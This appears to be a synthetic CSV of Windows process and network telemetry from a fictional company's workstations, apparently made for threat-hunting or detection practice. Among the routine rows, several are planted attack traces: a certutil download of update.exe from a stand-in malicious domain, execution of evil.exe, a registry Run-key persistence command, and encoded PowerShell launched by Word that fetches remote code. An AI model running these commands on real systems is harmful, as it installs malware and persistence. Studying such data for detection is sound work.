+2026-04-01 17:50:00,hr-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
+2026-04-01 17:51:00,eng-ws-01,diana,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 17:52:00,eng-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",1.1.1.1,443,outlook
+2026-04-01 17:53:00,sales-lt-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
+2026-04-01 17:54:00,hr-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,firefox
+2026-04-01 17:55:00,ops-ws-02,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 17:56:00,ops-ws-02,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 17:57:00,ops-ws-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 17:58:00,sales-lt-02,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 17:59:00,eng-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,192.168.1.12,0,none
+2026-04-01 18:00:00,sales-lt-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 18:01:00,fin-ws-02,diana,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 18:02:00,fin-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,10.0.0.10,0,none
+2026-04-01 18:03:00,eng-ws-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 18:04:00,fin-ws-02,diana,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
+2026-04-01 18:05:00,eng-ws-01,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,8.8.8.8,443,zoom-client
+2026-04-01 18:06:00,fin-ws-02,alice,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 18:07:00,fin-ws-02,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
+2026-04-01 18:08:00,fin-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 18:09:00,shared-jump-01,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
+2026-04-01 18:10:00,fin-ws-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 18:11:00,ops-ws-02,ethan,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 18:12:00,sales-lt-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
+2026-04-01 18:13:00,ops-ws-02,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,8.8.8.8,443,teams-client
+2026-04-01 18:14:00,ops-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",192.168.10.9,445,none
+2026-04-01 18:15:00,ops-ws-01,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 18:16:00,hr-ws-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 18:17:00,fin-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 18:17:00,fin-ws-01,alice,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-01 18:18:00,sales-lt-01,alice,slack.exe,explorer.exe,slack.exe --processStart slack.exe,142.250.183.14,443,slack-client
+2026-04-01 18:18:00,fin-ws-01,alice,evil.exe,explorer.exe,C:\Users\alice\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
+2026-04-01 18:19:00,ops-ws-02,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 18:19:00,fin-ws-01,alice,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,192.168.1.12,0,none
+2026-04-01 18:20:00,ops-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 18:21:00,ops-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 18:22:00,eng-ws-02,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 18:23:00,eng-ws-01,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.0.0.5,0,none
+2026-04-01 18:24:00,eng-ws-02,diana,code.exe,explorer.exe,"code.exe ""C:\Users\diana\Documents\project""",192.168.10.9,445,none
+2026-04-01 18:25:00,fin-ws-02,helen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 18:26:00,hr-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 18:27:00,eng-ws-02,helen,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
+2026-04-01 18:28:00,ops-ws-02,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,104.18.20.12,443,slack-client
+2026-04-01 18:29:00,hr-ws-01,george,teams.exe,explorer.exe,teams.exe --type=renderer,185.199.108.153,443,teams-client
+2026-04-01 18:30:00,ops-ws-01,ethan,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
+2026-04-01 18:31:00,sales-lt-02,helen,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 18:32:00,sales-lt-01,farah,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 18:33:00,ops-ws-01,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
+2026-04-01 18:34:00,fin-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
+2026-04-01 18:35:00,shared-jump-01,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
+2026-04-01 18:36:00,hr-ws-01,charlie,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 18:37:00,fin-ws-02,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 18:38:00,sales-lt-01,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-01 18:39:00,hr-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-01 18:40:00,sales-lt-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 18:41:00,fin-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 18:42:00,sales-lt-01,charlie,slack.exe,explorer.exe,slack.exe --processStart slack.exe,8.8.8.8,443,slack-client
+2026-04-01 18:43:00,sales-lt-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 18:44:00,ops-ws-02,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",10.0.2.20,0,none
+2026-04-01 18:45:00,eng-ws-02,charlie,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
+2026-04-01 18:46:00,sales-lt-01,farah,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
+2026-04-01 18:47:00,sales-lt-01,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 18:48:00,ops-ws-02,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
+2026-04-01 18:49:00,hr-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 18:50:00,sales-lt-02,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.0.1.15,445,none
+2026-04-01 18:51:00,eng-ws-02,bob,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 18:52:00,fin-ws-02,diana,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 18:53:00,hr-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-01 18:54:00,eng-ws-02,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 18:55:00,shared-jump-01,diana,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 18:55:00,sales-lt-01,farah,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
+2026-04-01 18:56:00,hr-ws-01,bob,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\bob\Documents\notes.txt""",10.0.0.5,0,none
+2026-04-01 18:56:00,sales-lt-01,farah,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
+2026-04-01 18:57:00,eng-ws-02,george,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
+2026-04-01 18:58:00,sales-lt-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
+2026-04-01 18:59:00,fin-ws-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,142.250.183.14,443,teams-client
+2026-04-01 19:00:00,ops-ws-01,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 19:01:00,fin-ws-02,diana,onenote.exe,explorer.exe,onenote.exe /background,192.168.1.12,0,none
+2026-04-01 19:02:00,hr-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
+2026-04-01 19:03:00,shared-jump-01,alice,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 19:04:00,fin-ws-02,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,chrome
+2026-04-01 19:05:00,hr-ws-01,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 19:06:00,shared-jump-01,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.10.9,0,none
+2026-04-01 19:07:00,ops-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.0.1.15,445,none
+2026-04-01 19:08:00,eng-ws-02,irfan,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 19:09:00,eng-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.2.20,0,none
+2026-04-01 19:10:00,eng-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 19:11:00,ops-ws-01,alice,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\alice\Documents\notes.txt""",10.1.5.12,0,none
+2026-04-01 19:12:00,sales-lt-01,helen,winword.exe,explorer.exe,winword.exe /background,172.16.4.25,0,none
+2026-04-01 19:13:00,sales-lt-02,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 19:14:00,shared-jump-01,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
+2026-04-01 19:15:00,eng-ws-02,bob,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
+2026-04-01 19:16:00,ops-ws-02,charlie,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
+2026-04-01 19:17:00,ops-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 19:18:00,hr-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",52.95.110.1,443,outlook
+2026-04-01 19:19:00,eng-ws-02,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,edge
+2026-04-01 19:20:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 19:21:00,ops-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 19:22:00,sales-lt-02,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
+2026-04-01 19:23:00,ops-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-01 19:24:00,ops-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 19:25:00,fin-ws-02,julia,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 19:26:00,ops-ws-02,charlie,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,edge
+2026-04-01 19:27:00,hr-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
+2026-04-01 19:28:00,ops-ws-02,ethan,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
+2026-04-01 19:29:00,sales-lt-01,bob,outlook.exe,explorer.exe,"outlook.exe /recycle ""bob@company.com""",52.95.110.1,443,outlook
+2026-04-01 19:30:00,fin-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 19:31:00,sales-lt-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
+2026-04-01 19:32:00,ops-ws-02,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 19:33:00,ops-ws-01,helen,outlook.exe,explorer.exe,"outlook.exe /recycle ""helen@company.com""",142.250.183.14,443,outlook
+2026-04-01 19:34:00,shared-jump-01,charlie,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
+2026-04-01 19:35:00,shared-jump-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 19:35:00,eng-ws-01,bob,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-01 19:36:00,fin-ws-01,george,outlook.exe,explorer.exe,"outlook.exe /recycle ""george@company.com""",52.95.110.1,443,outlook
+2026-04-01 19:36:00,eng-ws-01,bob,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-01 19:37:00,sales-lt-01,julia,code.exe,explorer.exe,"code.exe ""C:\Users\julia\Documents\project""",10.0.2.20,445,none
+2026-04-01 19:37:00,eng-ws-01,bob,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-01 19:38:00,ops-ws-01,george,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-01 19:39:00,ops-ws-01,bob,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 19:40:00,shared-jump-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 19:41:00,sales-lt-01,diana,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 19:42:00,eng-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 19:43:00,fin-ws-01,ethan,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
+2026-04-01 19:44:00,fin-ws-01,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",172.16.10.8,445,none
+2026-04-01 19:45:00,eng-ws-02,helen,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,151.101.1.69,443,zoom-client
+2026-04-01 19:46:00,shared-jump-01,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,185.199.108.153,443,slack-client
+2026-04-01 19:47:00,ops-ws-02,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
+2026-04-01 19:48:00,sales-lt-02,julia,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\julia\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 19:49:00,eng-ws-02,diana,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\diana\Documents\notes.txt""",172.16.4.25,0,none
+2026-04-01 19:50:00,fin-ws-01,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,edge
+2026-04-01 19:51:00,ops-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,edge
+2026-04-01 19:52:00,fin-ws-02,irfan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
+2026-04-01 19:53:00,sales-lt-02,julia,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 19:54:00,sales-lt-01,farah,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 19:55:00,shared-jump-01,irfan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 19:56:00,sales-lt-01,bob,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
+2026-04-01 19:57:00,eng-ws-02,bob,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
+2026-04-01 19:58:00,ops-ws-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",151.101.1.69,443,outlook
+2026-04-01 19:59:00,fin-ws-02,irfan,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 20:00:00,sales-lt-01,bob,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
+2026-04-01 20:01:00,ops-ws-01,bob,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 20:02:00,eng-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",1.1.1.1,443,outlook
+2026-04-01 20:03:00,fin-ws-01,diana,slack.exe,explorer.exe,slack.exe --processStart slack.exe,23.45.67.89,443,slack-client
+2026-04-01 20:04:00,sales-lt-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",185.199.108.153,443,outlook
+2026-04-01 20:05:00,ops-ws-02,helen,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 20:06:00,fin-ws-01,charlie,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\charlie\Documents\notes.txt""",172.16.10.8,0,none
+2026-04-01 20:07:00,ops-ws-02,alice,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
+2026-04-01 20:08:00,sales-lt-01,julia,explorer.exe,explorer.exe,explorer.exe /background,172.16.10.8,0,none
+2026-04-01 20:09:00,eng-ws-01,diana,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
+2026-04-01 20:10:00,eng-ws-02,julia,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
+2026-04-01 20:11:00,ops-ws-01,farah,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
+2026-04-01 20:12:00,eng-ws-02,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 20:13:00,sales-lt-02,farah,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,142.250.183.14,443,zoom-client
+2026-04-01 20:14:00,shared-jump-01,george,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 20:15:00,ops-ws-01,farah,teams.exe,explorer.exe,teams.exe --type=renderer,23.45.67.89,443,teams-client
+2026-04-01 20:16:00,hr-ws-01,julia,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,1.1.1.1,443,zoom-client
+2026-04-01 20:17:00,fin-ws-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,edge
+2026-04-01 20:18:00,eng-ws-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",23.45.67.89,443,outlook
+2026-04-01 20:19:00,sales-lt-02,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 20:20:00,shared-jump-01,george,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
+2026-04-01 20:21:00,sales-lt-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
+2026-04-01 20:22:00,sales-lt-02,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,52.95.110.1,443,teams-client
+2026-04-01 20:23:00,fin-ws-01,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",151.101.1.69,443,outlook
+2026-04-01 20:24:00,shared-jump-01,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",8.8.8.8,443,outlook
+2026-04-01 20:25:00,sales-lt-01,charlie,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 20:26:00,sales-lt-02,irfan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\irfan\Documents\notes.txt""",192.168.1.12,0,none
+2026-04-01 20:27:00,ops-ws-02,helen,explorer.exe,explorer.exe,explorer.exe /background,192.168.1.12,0,none
+2026-04-01 20:28:00,sales-lt-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,chrome
+2026-04-01 20:29:00,hr-ws-01,alice,excel.exe,explorer.exe,excel.exe /background,10.0.2.20,0,none
+2026-04-01 20:30:00,sales-lt-02,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,firefox
+2026-04-01 20:31:00,sales-lt-01,irfan,slack.exe,explorer.exe,slack.exe --processStart slack.exe,1.1.1.1,443,slack-client
+2026-04-01 20:31:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
+2026-04-01 20:32:00,shared-jump-01,bob,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
+2026-04-01 20:32:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,winhttp
+2026-04-01 20:33:00,ops-ws-01,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.0.0.5,445,none
+2026-04-01 20:33:00,eng-ws-02,irfan,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
+2026-04-01 20:34:00,sales-lt-01,irfan,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
+2026-04-01 20:35:00,eng-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
+2026-04-01 20:36:00,sales-lt-01,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",1.1.1.1,443,outlook
+2026-04-01 20:37:00,sales-lt-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",10.0.2.20,445,none
+2026-04-01 20:38:00,fin-ws-02,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
+2026-04-01 20:39:00,shared-jump-01,george,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,chrome
+2026-04-01 20:40:00,fin-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,104.18.20.12,443,zoom-client
+2026-04-01 20:41:00,sales-lt-02,ethan,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,185.199.108.153,443,zoom-client
+2026-04-01 20:42:00,fin-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.1.5.12,0,none
+2026-04-01 20:43:00,hr-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
+2026-04-01 20:44:00,eng-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",172.16.10.8,445,none
+2026-04-01 20:45:00,eng-ws-01,ethan,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\ethan\Documents\notes.txt""",10.0.1.15,0,none
+2026-04-01 20:46:00,fin-ws-01,diana,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
+2026-04-01 20:47:00,ops-ws-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
+2026-04-01 20:48:00,ops-ws-02,george,teams.exe,explorer.exe,teams.exe --type=renderer,1.1.1.1,443,teams-client
+2026-04-01 20:49:00,eng-ws-02,george,slack.exe,explorer.exe,slack.exe --processStart slack.exe,52.95.110.1,443,slack-client
+2026-04-01 20:50:00,ops-ws-01,helen,teams.exe,explorer.exe,teams.exe --type=renderer,104.18.20.12,443,teams-client
+2026-04-01 20:51:00,shared-jump-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.0.0.10,445,none
+2026-04-01 20:52:00,sales-lt-01,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,edge
+2026-04-01 20:53:00,fin-ws-02,george,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
+2026-04-01 20:54:00,hr-ws-01,farah,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
+2026-04-01 20:55:00,sales-lt-02,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,edge
+2026-04-01 20:56:00,eng-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,chrome
+2026-04-01 20:57:00,eng-ws-02,charlie,teams.exe,explorer.exe,teams.exe --type=renderer,151.101.1.69,443,teams-client
+2026-04-01 20:58:00,eng-ws-01,george,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
+2026-04-01 20:59:00,hr-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,10.0.0.10,0,none
+2026-04-01 21:00:00,ops-ws-01,ethan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
+2026-04-01 21:01:00,fin-ws-01,alice,explorer.exe,explorer.exe,explorer.exe /background,10.1.5.12,0,none
+2026-04-01 21:02:00,fin-ws-02,george,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\george\Documents\notes.txt""",10.0.0.10,0,none
+2026-04-01 21:02:00,fin-ws-02,helen,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
+2026-04-01 21:03:00,eng-ws-02,alice,winword.exe,explorer.exe,winword.exe /background,192.168.1.12,0,none
+2026-04-01 21:03:00,fin-ws-02,helen,evil.exe,explorer.exe,C:\Users\helen\AppData\Local\Temp\evil.exe,10.1.5.12,0,none
+2026-04-01 21:04:00,eng-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --url=zoommtg://companymeeting,45.33.32.156,443,zoom-client
+2026-04-01 21:04:00,fin-ws-02,helen,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,10.1.5.12,0,none
+2026-04-01 21:05:00,sales-lt-02,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
+2026-04-01 21:06:00,ops-ws-01,bob,explorer.exe,explorer.exe,explorer.exe /background,10.0.1.15,0,none
